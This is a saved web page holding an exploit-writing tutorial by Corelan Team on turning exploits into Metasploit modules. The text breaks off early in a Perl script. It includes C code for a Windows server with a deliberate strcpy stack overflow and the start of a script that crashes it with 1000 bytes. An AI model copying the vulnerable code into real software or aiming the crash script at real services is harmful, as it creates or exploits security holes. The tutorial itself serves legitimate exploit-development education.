<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0114)http://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/ -->
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US" class="chrome  win"><head profile="http://gmpg.org/xfn/11"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
<title>Exploit writing tutorial part 4 : From Exploit to Metasploit – The basics | Corelan Team</title>
<link rel="stylesheet" href="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/style.css" type="text/css" media="screen">
<!--[if IE 6]><link rel="stylesheet" href="https://www.corelan.be/wp-content/themes/corelan/style.ie6.css" type="text/css" media="screen" /><![endif]-->
<!--[if IE 7]><link rel="stylesheet" href="https://www.corelan.be/wp-content/themes/corelan/style.ie7.css" type="text/css" media="screen" /><![endif]-->
<link rel="pingback" href="https://www.corelan.be/xmlrpc.php">
<link rel="alternate" type="application/rss+xml" title="Corelan Team » Feed" href="https://www.corelan.be/index.php/feed/">
<link rel="alternate" type="application/rss+xml" title="Corelan Team » Comments Feed" href="https://www.corelan.be/index.php/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Corelan Team » Exploit writing tutorial part 4 : From Exploit to Metasploit – The basics Comments Feed" href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/feed/">
<link rel="stylesheet" id="thickbox-css" href="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/thickbox.css" type="text/css" media="all">
<link rel="stylesheet" id="toc-screen-css" href="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/screen.css" type="text/css" media="all">
<link rel="stylesheet" id="wp-downloadmanager-css" href="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/download-css.css" type="text/css" media="all">
<link rel="stylesheet" id="wp-pagenavi-css" href="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/pagenavi-css.css" type="text/css" media="all">
<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/l10n.js"></script>
<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/jquery.js"></script>
<script type="text/javascript">
/* <![CDATA[ */
var tocplus = {
	visibility_show: "show",
	visibility_hide: "hide",
	width: "275px"
};
/* ]]> */
</script>
<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/front.js"></script>
<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/jquery.cookie.min.js"></script>
<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/comment-reply.js"></script>
<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/sf-forum.js"></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.corelan.be/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.corelan.be/wp-includes/wlwmanifest.xml"> 
<link rel="index" title="Corelan Team" href="https://www.corelan.be/">
<link rel="start" title="Welcome to my blog (again)" href="https://www.corelan.be/index.php/2007/07/11/welcome-to-my-blog-again/">
<link rel="prev" title="Exploit writing tutorial part 3b : SEH Based Exploits – just another example" href="https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/">
<link rel="next" title="WPA TKIP cracked in a minute – time to move on to WPA2" href="https://www.corelan.be/index.php/2009/08/29/wpa-tkip-cracked-in-a-minute-time-to-move-on-to-wpa2/">
<link rel="shortlink" href="https://www.corelan.be/?p=2196">

<!-- All in One SEO Pack 1.6.13.4 by Michael Torbert of Semper Fi Web Designob_start_detected [-1,-1] -->
<meta name="description" content="In the first parts of the exploit writing tutorial, I have discussed some common vulnerabilities that can lead to 2 types of exploits : stack based buffer">
<meta name="keywords" content="buffer,check,custom vulnserver,encoder,exe,exe windows,exploit,exploit custom,exploits,include,initialize,metasploit,meterpreter,module,msf,msf exploit,msf/core,offset,payload,port,print,rb,require,ruby,shellcode,socket,vulnserver,windows,windows system,001_security,exploit writing tutorials">
<link rel="canonical" href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/">
<!-- /all in one seo pack -->

<style type="text/css">
div.aka_half {
	float: left;
	overflow: auto;
	width: 45%;
}
div.aka_clear {
	clear: both;
	float: none;
}
</style>
		
	<script type="text/javascript">
		//<![CDATA[
		function DisplayAttributions(attribution_text)
		{
			document.getElementById("dprv_attribution").innerHTML = attribution_text;
			document.getElementById("dprv_attribution").title = "Attributions - owner(s) of some content";
			document.getElementById("dprv_attribution").onmouseover = "";
		}
		function DisplayLicense(post_id)
		{
			document.getElementById('license_panel' + post_id).style.display='block';
			document.getElementById('license_panel' + post_id).style.zIndex='2';
		}
		function HideLicense(post_id)
		{
			document.getElementById('license_panel' + post_id).style.display='none';
			//document.getElementById('license_panel' + post_id).style.zIndex='0';
		}
	//]]>
	</script><link rel="canonical" href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/">	<link type="text/css" rel="stylesheet" href="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shCore.css">
	<link type="text/css" rel="stylesheet" href="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shThemeDefault.css">
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shCore.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushBash.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushCpp.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushCSharp.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushCss.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushDelphi.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushDiff.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushGroovy.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushJava.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushJScript.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushPerl.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushPhp.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushPlain.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushPython.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushRuby.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushScala.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushSql.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushVb.js"></script>
	<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/shBrushXml.js"></script>
	<script type="text/javascript">		
		SyntaxHighlighter.config.clipboardSwf = 'https://www.corelan.be/wp-content/plugins/syntax-highlighter-and-code-prettifier/scripts/clipboard.swf';
		SyntaxHighlighter.all();
	</script>
	
<!-- Start Of Script Generated By WP-PostViews 1.60 -->
<script type="text/javascript">
/* <![CDATA[ */
jQuery.ajax({type:'GET',url:'https://www.corelan.be/wp-content/plugins/wp-postviews/wp-postviews.php',data:'postviews_id=2196',cache:false});/* ]]> */
</script>
<!-- End Of Script Generated By WP-PostViews 1.60 -->
<link rel="shortcut icon" href="https://www.corelan.be/wp-content/themes/corelan/favicon.ico">
		<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/script.js"></script>
</head>
<body class="single single-post postid-2196 single-format-standard">
<div id="art-main">
    <div class="art-header">
        <div class="art-header-center">
            <div class="art-header-png"></div>
        </div>
    <div class="art-header-wrapper">
    <div class="art-header-inner">
        <div class="art-headerobject"></div>
        <div class="art-logo">
                <h1 id="name-text" class="art-logo-name"><a href="https://www.corelan.be/">Corelan Team</a></h1>
                            <h2 id="slogan-text" class="art-logo-text">:: Knowledge is not an object, it's a flow ::</h2>
                </div>
    </div>
    </div>
    </div>
    <div class="art-sheet">
        <div class="art-sheet-tl"></div>
        <div class="art-sheet-tr"></div>
        <div class="art-sheet-bl"></div>
        <div class="art-sheet-br"></div>
        <div class="art-sheet-tc"></div>
        <div class="art-sheet-bc"></div>
        <div class="art-sheet-cl"></div>
        <div class="art-sheet-cr"></div>
        <div class="art-sheet-cc"></div>
        <div class="art-sheet-body">
            <div class="art-nav">
            	<div class="art-nav-l"></div>
            	<div class="art-nav-r"></div>
            	
<ul class="art-menu">
	<li><a href="https://www.corelan.be/" title="Home"><span class="l"> </span><span class="r"> </span><span class="t">Home</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="http://www.corelan.be/wp-login.php" title="Login/Register/Logout"><span class="l"> </span><span class="r"> </span><span class="t">Login/Register/Logout</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/articles/" title="Articles"><span class="l"> </span><span class="r"> </span><span class="t">Articles</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="http://www.corelan.be:8800/?cat=11" title="Free Tools"><span class="l"> </span><span class="r"> </span><span class="t">Free Tools</span></a>
	<ul>
		<li><a href="http://www.corelan.be:8800/index.php/category/active-directory/" title="AD &amp; CS">AD &amp; CS</a>
		<ul>
			<li><a href="http://www.corelan.be:8800/index.php/2007/11/18/free-tool-pve-active-directory-disable-users/" title="AD Disable Users">AD Disable Users</a>
			</li>
			<li><a href="http://www.corelan.be:8800/index.php/2009/04/10/free-tool-windows-2008-certificate-authority-certificate-list-utility-for-pending-requests-and-about-to-expire-certificates/" title="Certificate List Utility">Certificate List Utility</a>
			</li>
			<li><a href="https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/" title="PVE Find AD User">PVE Find AD User</a>
			</li>
		</ul>
		</li>
		<li><a href="http://www.corelan.be:8800/index.php/category/exchange/" title="Exchange Transport Agents">Exchange Transport Agents</a>
		<ul>
			<li><a href="http://www.corelan.be:8800/index.php/2008/07/21/free-tool-attachment-filtering-with-exchange-2007-custom-transport-agent/" title="Attachment filter">Attachment filter</a>
			</li>
			<li><a href="http://www.corelan.be:8800/index.php/2009/06/20/exchange-20072010-renaming-attachments-on-the-fly-custom-transport-agent/" title="Attachment rename">Attachment rename</a>
			</li>
		</ul>
		</li>
		<li><a href="http://www.corelan.be:8800/index.php/category/networking/" title="Networking">Networking</a>
		<ul>
			<li><a href="https://www.corelan.be/index.php/my-free-tools/networking/cisco-switch-backup-utility/" title="Cisco switch backup utility">Cisco switch backup utility</a>
			</li>
			<li><a href="http://www.corelan.be:8800/index.php/2009/01/28/monitoring-your-network-with-powershell/" title="Network monitoring with powershell">Network monitoring with powershell</a>
			</li>
			<li><a href="http://www.corelan.be:8800/index.php/2008/09/26/free-tool-pve-tcp-ping-utility/" title="TCP Ping">TCP Ping</a>
			</li>
		</ul>
		</li>
		<li><a href="http://redmine.corelan.be:8800/projects/pvepop3collector" title="PVE POP3 Collector">PVE POP3 Collector</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/my-free-tools/pve-pop3-collector-on-the-net/" title="PVE POP3 Collector on the net">PVE POP3 Collector on the net</a>
		</li>
		<li><a href="http://www.corelan.be:8800/index.php/category/security/" title="Security Related Tools">Security Related Tools</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/my-free-tools/downloads/" title="All downloads on this blog">All downloads on this blog</a>
		</li>
	</ul>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/forum/" title="Forums"><span class="l"> </span><span class="r"> </span><span class="t">Forums</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="http://www.corelan.be:8800/index.php/category/security/" title="Security"><span class="l"> </span><span class="r"> </span><span class="t">Security</span></a>
	<ul>
		<li><a href="https://www.corelan.be/index.php/security/corelan-team-members/" title="Corelan Team Members">Corelan Team Members</a>
		</li>
		<li><a href="http://www.corelan.be:8800/index.php/forum/security-advisories/" title="Corelan Team Security Advisories">Corelan Team Security Advisories</a>
		</li>
		<li><a href="http://www.corelan-training.com/index.php/training/corelan-live/" title="Corelan Training &quot;Corelan Live - Win32 Exploit Development Bootcamp&quot;">Corelan Training "Corelan Live…</a>
		</li>
		<li><a href="http://www.corelan.be:8800/index.php/forum/writing-exploits" title="Exploit writing - forum">Exploit writing – forum</a>
		</li>
		<li><a href="http://www.corelan.be:8800/index.php/category/security/exploit-writing-tutorials/" title="Exploit writing tutorials">Exploit writing tutorials</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/security/metasploit/" title="Metasploit">Metasploit</a>
		<ul>
			<li><a href="https://www.corelan.be/index.php/2010/10/12/death-of-an-ftp-client/" title="FTP Client fuzzer">FTP Client fuzzer</a>
			</li>
			<li><a href="https://www.corelan.be/index.php/2010/11/12/metasploit-module-http-form-field-fuzzer/" title="HTTP Form field fuzzer">HTTP Form field fuzzer</a>
			</li>
			<li><a href="https://www.corelan.be/index.php/security/metasploit/simple-ftp-fuzzer-metasploit-module/" title="Simple FTP Fuzzer - Metasploit Module">Simple FTP Fuzzer – Metasploit…</a>
			</li>
		</ul>
		</li>
		<li><a href="http://www.corelan.be:8800/index.php/2009/01/31/nessus-wrapper-for-ike-scan/" title="Nessus/Openvas ike-scan wrapper">Nessus/Openvas ike-scan wrapper</a>
		</li>
		<li><a href="http://www.corelan.be:8800/index.php/disclosure-policy/" title="Vulnerability Disclosure Policy">Vulnerability Disclosure Policy</a>
		</li>
		<li><a href="http://redmine.corelan.be/projects/mona" title="mona.py PyCommand for Immunity Debugger">mona.py PyCommand for Immunity Debugger</a>
		<ul>
			<li><a href="https://redmine.corelan.be/projects/mona" title="Download mona.py">Download mona.py</a>
			</li>
			<li><a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/" title="Mona.py - documentation">Mona.py – documentation</a>
			</li>
		</ul>
		</li>
		<li><a href="https://www.corelan.be/index.php/security/corelan-ropdb/" title="Corelan ROPdb">Corelan ROPdb</a>
		</li>
	</ul>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/links/" title="Links"><span class="l"> </span><span class="r"> </span><span class="t">Links</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/terms-of-use/" title="Terms of use"><span class="l"> </span><span class="r"> </span><span class="t">Terms of use</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/donate/" title="Donate"><span class="l"> </span><span class="r"> </span><span class="t">Donate</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/about-me/" title="About me"><span class="l"> </span><span class="r"> </span><span class="t">About me</span></a>
	<ul>
		<li><a href="http://www.corelan.be/index.php/about-me/" title="About me">About me</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/about-me/publickeys/" title="Corelan public keys">Corelan public keys</a>
		</li>
	</ul>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/ssl/" title="SSL"><span class="l"> </span><span class="r"> </span><span class="t">SSL</span></a>
	</li>
</ul>
            </div>
<div class="art-content-layout">
    <div class="art-content-layout-row">
        <div class="art-layout-cell art-content">
			


<br><center><script type="text/javascript"><!--
google_ad_client = "pub-8134501503628637";
/* CorelanTopBottom */
google_ad_slot = "7639469771";
google_ad_width = 468;
google_ad_height = 60;
//-->
</script>
<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/show_ads.js">
</script><ins style="display:inline-table;border:none;height:60px;margin:0;padding:0;position:relative;visibility:visible;width:468px"><ins id="aswift_0_anchor" style="display:block;border:none;height:60px;margin:0;padding:0;position:relative;visibility:visible;width:468px"><iframe allowtransparency="true" frameborder="0" height="60" hspace="0" marginwidth="0" marginheight="0" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){i+=&#39;.call&#39;;setTimeout(h,0)}else if(h.match){i+=&#39;.nav&#39;;w.location.replace(h)}s.log&amp;&amp;s.log.push(i)}" scrolling="no" vspace="0" width="468" id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;"></iframe></ins></ins></center><br><div class="art-post">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    	<div class="navigation">
		<div class="alignleft">« <a href="https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/" title="Exploit writing tutorial part 3b : SEH Based Exploits – just another example" rel="prev">Exploit writing tutorial part 3b : SEH Based Exploits – just another…</a></div>
		<div class="alignright"><a href="https://www.corelan.be/index.php/2009/08/29/wpa-tkip-cracked-in-a-minute-time-to-move-on-to-wpa2/" title="WPA TKIP cracked in a minute – time to move on to WPA2" rel="next">WPA TKIP cracked in a minute – time to move on to WPA2</a> »</div>
	 </div>	                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	<br><!-- Breadcrumb NavXT 3.9.0 -->
You are here : <a title="Go to Home." href="https://www.corelan.be/">Home</a> » <a title="Go to the 001_Security category archives." href="https://www.corelan.be/index.php/category/security/">001_Security</a> » <a title="Go to the Exploit Writing Tutorials category archives." href="https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/">Exploit Writing Tutorials</a> » <a title="Reload the current page." href="">Exploit writing tutorial part 4 : From Exploit to Metasploit – The basics</a><center><br><b>22,905 views</b><a id="pdfbutton" href="https://www.corelan.be/wp-login.php?redirect_to=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F08%2F12%2Fexploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics%2F" title="You must login first"><font size="-3" color="#ebebeb"><img src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/pdf_lock.png" align="absmiddle">This page as PDF (Login first !)</font><br></a> | <font size="-3" color="#ebebeb"><a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/print/" title="Print This Post" rel="nofollow"><img class="WP-PrintIcon" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/printer_famfamfam.gif" alt="Print This Post" title="Print This Post" style="border: 0px;"></a>&nbsp;<a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/print/" title="Print This Post" rel="nofollow">Print This Post</a>
</font><br></center><div class="art-post post-2196 post type-post status-publish format-standard hentry category-security category-exploit-writing-tutorials category-exploits tag-buffer tag-check tag-custom-vulnserver tag-encoder tag-exe tag-exe-windows tag-exploit tag-exploit-custom tag-exploits tag-include tag-initialize tag-metasploit tag-meterpreter tag-module tag-msf tag-msf-exploit tag-msfcore tag-offset tag-payload tag-port tag-print tag-rb tag-require tag-ruby tag-shellcode tag-socket tag-vulnserver tag-windows tag-windows-system" id="post-2196">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            <h2 class="art-postheader"><img src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/postheadericon.png" width="32" height="30" alt="">Exploit writing tutorial part 4 : From Exploit to Metasploit – The basics</h2><div class="art-postmetadataheader"><div class="art-postheadericons art-metadata-icons"><span class="date">Published</span> <span class="entry-date"><abbr class="published" title="22:51">August 12, 2009</abbr></span> | <img src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/postauthoricon.png" width="18" height="18" alt=""><span class="author">By</span> <span class="author vcard"><a class="url fn n" href="https://www.corelan.be/index.php/author/admin1/" title="View all posts by Corelan Team (corelanc0d3r)">Corelan Team (corelanc0d3r)</a></span></div></div>	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    <p>In the first parts of the exploit writing tutorial, I have discussed some common vulnerabilities that can lead to 2 types of exploits : stack based buffer overflows (with direct EIP overwrite), and stack based buffer overflows that take advantage of SEH chains. In my examples, I have used perl to demonstrate how to build a working exploit.</p>
<p>Obviously, writing exploits is not limited to perl only. I guess every programming language could be used to write exploits… so you can just pick the one that you are most familiar with. (python, c, c++, C#, etc)</p>
<p>Despite the fact that these custom written exploits will work just fine, it may be nice to be able to include your own exploits in the metasploit framework in order to take advantage of some of the unique metasploit features.</p>
<p>So today, I’m going to explain how exploits can be written as a metasploit module.</p>
<p>Metasploit modules are writting in ruby. Even if you don’t know a lot about ruby, you should still be able to write a metasploit exploit module based on this tutorial and the existing exploits available in metasploit.</p>
<h3>Metasploit exploit module structure</h3>
<p>A typical metasploit exploit module consists of the following components :</p>
<ul>
<li>header and some dependencies
<ul>
<li>Some comments about the exploit module </li>
<li>require ‘msf/core’ </li>
</ul>
</li>
<li>class definition </li>
<li>includes </li>
<li>“def” definitions :
<ul>
<li>initialize </li>
<li>check (optional) </li>
<li>exploit </li>
</ul>
</li>
</ul>
<p>You can put comments in your metasploit module by using the # character.&nbsp; That’s all we need to know for now, let’s look at the steps to build a metasploit exploit module.</p>
<h3>Case study : building an exploit for a simple vulnerable server</h3>
<p>We’ll use the following vulnerable server code (C) to demonstrate the building process :</p>
<pre style="border-bottom: #808080 1px solid; border-left: #808080 1px solid; padding-bottom: 5px; background-color: #5d5d5d; min-height: 40px; padding-left: 5px; width: 650px; padding-right: 5px; overflow: auto; border-top: #808080 1px solid; border-right: #808080 1px solid; padding-top: 5px">#include &lt;iostream.h&gt;
#include &lt;winsock.h&gt;
#include &lt;windows.h&gt;

<span style="color: #d7df01">//load windows socket</span>
#pragma comment(lib, "<span style="color: #7fec7f">wsock32.lib</span>")

<span style="color: #d7df01">//Define Return Messages</span>
#define SS_ERROR 1
#define SS_OK 0

<span style="color: #5576D1">void</span> pr( <span style="color: #5576D1">char</span> *str)
{
   <span style="color: #5576D1">char</span> buf[500]="<span style="color: #7fec7f"></span>";
   <span style="color: #5576D1">strcpy</span>(buf,str);
}
<span style="color: #5576D1">void</span> sError(<span style="color: #5576D1">char</span> *str)
{
   MessageBox (NULL, str, "<span style="color: #7fec7f">socket Error</span>" ,MB_OK);
   WSACleanup();
}

<span style="color: #5576D1">int</span> main(<span style="color: #5576D1">int</span> argc, <span style="color: #5576D1">char</span> **argv)
{

WORD sockVersion;
WSADATA wsaData;

<span style="color: #5576D1">int</span> rVal;
<span style="color: #5576D1">char</span> Message[5000]="<span style="color: #7fec7f"></span>";
<span style="color: #5576D1">char</span> buf[2000]="<span style="color: #7fec7f"></span>";

u_short LocalPort;
LocalPort = 200;

<span style="color: #d7df01">//wsock32 initialized for usage</span>
sockVersion = MAKEWORD(1,1);
WSAStartup(sockVersion, &amp;wsaData);

<span style="color: #d7df01">//create server socket</span>
SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);

<span style="color: #5576D1">if</span>(serverSocket == INVALID_SOCKET)
{
   sError("<span style="color: #7fec7f">Failed socket()</span>");
   <span style="color: #5576D1">return</span> SS_ERROR;
}

SOCKADDR_IN <span style="color: #5576D1">sin</span>;
<span style="color: #5576D1">sin</span>.sin_family = PF_INET;
<span style="color: #5576D1">sin</span>.sin_port = htons(LocalPort);
<span style="color: #5576D1">sin</span>.sin_addr.s_addr = INADDR_ANY;

<span style="color: #d7df01">//bind the socket</span>
rVal = bind(serverSocket, (LPSOCKADDR)&amp;<span style="color: #5576D1">sin</span>, <span style="color: #5576D1">sizeof</span>(<span style="color: #5576D1">sin</span>));
<span style="color: #5576D1">if</span>(rVal == SOCKET_ERROR)
{
   sError("<span style="color: #7fec7f">Failed bind()</span>");
   WSACleanup();
   <span style="color: #5576D1">return</span> SS_ERROR;
}

<span style="color: #d7df01">//get socket to listen</span>
rVal = listen(serverSocket, 10);
<span style="color: #5576D1">if</span>(rVal == SOCKET_ERROR)
{
   sError("<span style="color: #7fec7f">Failed listen()</span>");
   WSACleanup();
   <span style="color: #5576D1">return</span> SS_ERROR;
}

<span style="color: #d7df01">//wait for a client to connect</span>
SOCKET clientSocket;
clientSocket = accept(serverSocket, NULL, NULL);
<span style="color: #5576D1">if</span>(clientSocket == INVALID_SOCKET)
{
   sError("<span style="color: #7fec7f">Failed accept()</span>");
   WSACleanup();
   <span style="color: #5576D1">return</span> SS_ERROR;
}

<span style="color: #5576D1">int</span> bytesRecv = SOCKET_ERROR;
<span style="color: #5576D1">while</span>( bytesRecv == SOCKET_ERROR )
{
   <span style="color: #d7df01">//receive the data that is being sent by the client max limit to 5000 bytes.</span>
   bytesRecv = recv( clientSocket, Message, 5000, 0 );

   <span style="color: #5576D1">if</span> ( bytesRecv == 0 || bytesRecv == WSAECONNRESET )
   {
      <span style="color: #5576D1">printf</span>( "<span style="color: #7fec7f">\nConnection Closed.\n</span>");
      <span style="color: #5576D1">break</span>;
   }
}

<span style="color: #d7df01">//Pass the data received to the function pr</span>
pr(Message);

<span style="color: #d7df01">//close client socket</span>
closesocket(clientSocket);
<span style="color: #d7df01">//close server socket</span>
closesocket(serverSocket);

WSACleanup();

<span style="color: #5576D1">return</span> SS_OK;
}</pre>
<pre class="csharpcode">&nbsp;</pre>
<p><!--.csharpcode, .csharpcode pre { 	font-size: small; 	color: black; 	font-family: consolas, "Courier New", courier, monospace; 	background-color: #ffffff; 	/*white-space: pre;*/ } .csharpcode pre { margin: 0em; } .csharpcode .rem { color: #d7df01; } .csharpcode .kwrd { color: #0000ff; } .csharpcode .str { color: #006080; } .csharpcode .op { color: #0000c0; } .csharpcode .preproc { color: #cc6633; } .csharpcode .asp { background-color: #ffff00; } .csharpcode .html { color: #800000; } .csharpcode .attr { color: #ff0000; } .csharpcode .alt  { 	background-color: #f4f4f4; 	width: 100%; 	margin: 0em; } .csharpcode .lnum { color: #606060; } --></p>
<p>Compile the code and run it on a Windows 2003 server R2 with SP2. (I have used lcc-win32 to compile the code)</p>
<p>When you send 1000 bytes to the server, the server will crash.</p>
<p>The following perl script demonstrates the crash :</p>
<p><!--.csharpcode, .csharpcode pre { 	font-size: small; 	color: black; 	font-family: consolas, "Courier New", courier, monospace; 	background-color: #ffffff; 	/*white-space: pre;*/ } .csharpcode pre { margin: 0em; } .csharpcode .rem { color: #d7df01; } .csharpcode .kwrd { color: #0000ff; } .csharpcode .str { color: #006080; } .csharpcode .op { color: #0000c0; } .csharpcode .preproc { color: #cc6633; } .csharpcode .asp { background-color: #ffff00; } .csharpcode .html { color: #800000; } .csharpcode .attr { color: #ff0000; } .csharpcode .alt  { 	background-color: #f4f4f4; 	width: 100%; 	margin: 0em; } .csharpcode .lnum { color: #606060; } --></p>
<pre style="border-bottom: #808080 1px solid; border-left: #808080 1px solid; padding-bottom: 5px; background-color: #5d5d5d; min-height: 40px; padding-left: 5px; width: 650px; padding-right: 5px; overflow: auto; border-top: #808080 1px solid; border-right: #808080 1px solid; padding-top: 5px"><span style="color: #5576D1">use</span> strict;
<span style="color: #5576D1">use</span> Socket;
<span style="color: #5576D1">my</span> $junk = "<span style="color: #7fec7f">\x41</span>" x1000;

# initialize host and port
<span style="color: #5576D1">my</span> $host = <span style="color: #5576D1">shift</span> || 'localhost';
